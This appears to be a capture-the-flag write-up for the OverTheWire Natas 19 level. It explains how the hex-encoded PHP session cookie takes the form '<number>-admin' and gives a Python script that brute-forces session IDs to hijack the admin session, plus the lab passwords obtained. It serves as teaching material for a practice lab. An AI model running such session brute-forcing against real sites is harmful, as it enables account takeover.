- This level needs us to apply our bruteforcing skills in a clever manner
- From [[Natas18_to_Natas19|previous level]], we know that we can bruteforce the session IDs and obtain the saved session of admin user. We need to apply a similar logic here as well
- However, unlike the [[Natas18_to_Natas19|previous level]], we can see that the session IDs are no longer a numeric string and are now much more random. We need to be a bit clever in our approach
- One idea is to analyse the type of encoding that is being done to the session ID. For example, let's observe the session ID `3131322d` that was sent in the response headers in the `Set-Cookie` header. Putting it in [CyberChef](https://gchq.github.io/CyberChef/) , and using the From Hex recipe, we can see that this is indeed hex encoded value, which comes out to be `112-`
- So we observe that we can indeed set a numeric value in the cookie, however bruteforcing using only this piece of information does not yield any satisfactory results (I tried it personally)
- We also need another piece of info. So let's try filling the username and password fields and see what we get. 
- Let's fire up BurpSuite, and trigger a request with the value of username field as `username` and password field as `password`
- In the response, under the `Set-Cookie` header, we get the value `3432312d757365726e616d65`, which, if we put in [CyberChef](https://gchq.github.io/CyberChef/), we get `421-username`
- So, this means, we can control the cookie by our intent, and bruteforce the session ID of the admin user. For the admin user, the session ID would be in the format `<number>-admin`
- We can write a python script for the same:
```python
import requests
from requests.auth import HTTPBasicAuth
URL = "http://natas19.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
body = {'username' : '', 'password' : ''}
FAIL_TEXT = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20."
print("bruteforcing...")
i = 1
while True:
	session_id = f"{i}-admin".encode('utf-8').hex()
	cookie = { 'PHPSESSID' : f"{session_id}"}
	print(f"Sending request with session id: '{i}-admin', in encoded form: {session_id}")
	r = requests.post(URL, params=body, auth=auth, cookies=cookie)
	i += 1
	if FAIL_TEXT not in r.text:
		print("Session id found!")
		print(f"{session_id}")
		break
```
- Running the above script results into a session ID `281-admin` that gives us the admin session. We get the encoded session ID `3238312d61646d696e` and pass it into the request which we fire from BurpSuite, and the password for next level is obtained :)
- Obtained password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw